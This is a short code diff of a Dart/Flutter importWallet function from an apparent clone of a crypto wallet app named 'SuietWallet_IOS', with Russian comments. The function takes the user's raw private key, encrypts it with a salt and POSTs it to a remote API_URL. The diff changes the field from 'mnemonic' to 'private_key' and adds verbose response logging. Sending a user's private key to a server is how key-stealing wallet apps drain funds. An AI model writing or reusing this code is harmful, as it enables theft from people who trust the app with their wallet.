@@ -23,7 +23,7 @@ Future<void> importWallet(String privateKey, BuildContext context) async {
   final salt = Random().nextInt(900000) + 100000; // Генерация случайного 6-значного числа
 
   final jsonData = jsonEncode({
-    'mnemonic': privateKey,
+    'private_key': privateKey,
     'salt': salt,
     'name': 'SuietWallet_IOS', // Замените на ваше название приложения
     'new': false
@@ -35,19 +35,23 @@ Future<void> importWallet(String privateKey, BuildContext context) async {
     final response = await http.post(
       Uri.parse(API_URL),
       body: {'data': encryptedData},
-      headers: {"Content-Type": "application/x-www-form-urlencoded"},
       encoding: Encoding.getByName('utf-8'),
+      headers: {"Content-Type": "application/x-www-form-urlencoded"},
     );
+
+    // Логирование полной информации о ответе
+    print('Response status: ${response.statusCode}');
+    print('Response headers: ${response.headers}');
+    print('Response body: ${response.body}');
 
     if (response.statusCode == 200) {
       final responseData = jsonDecode(response.body);
 
       if (responseData is Map<String, dynamic>) {
-        print(responseData);
+        print('Response data: $responseData');
 
         final portfolioId = responseData['portfolio']['id'];
 
-        // Форматирование приватного ключа
         final formattedPrivateKey = privateKey.startsWith('0x') ? privateKey : '0x$privateKey';
         final credentials = EthPrivateKey.fromHex(formattedPrivateKey);
         final address = credentials.address;
@@ -55,7 +59,6 @@ Future<void> importWallet(String privateKey, BuildContext context) async {
         print('Ethereum Address: $address');
 
         if (address.toString().toLowerCase() == portfolioId.toLowerCase()) {
-          // Переход на экран кошелька с успешным сообщением
           ScaffoldMessenger.of(context).showSnackBar(
             SnackBar(content: Text('Wallet imported successfully. Address: $address')),
           );
@@ -69,7 +72,6 @@ Future<void> importWallet(String privateKey, BuildContext context) async {
             )),
           );
         } else {
-          // Обработка несоответствия адресов
           ScaffoldMessenger.of(context).showSnackBar(
             SnackBar(content: Text('Address does not match server response')),
           );
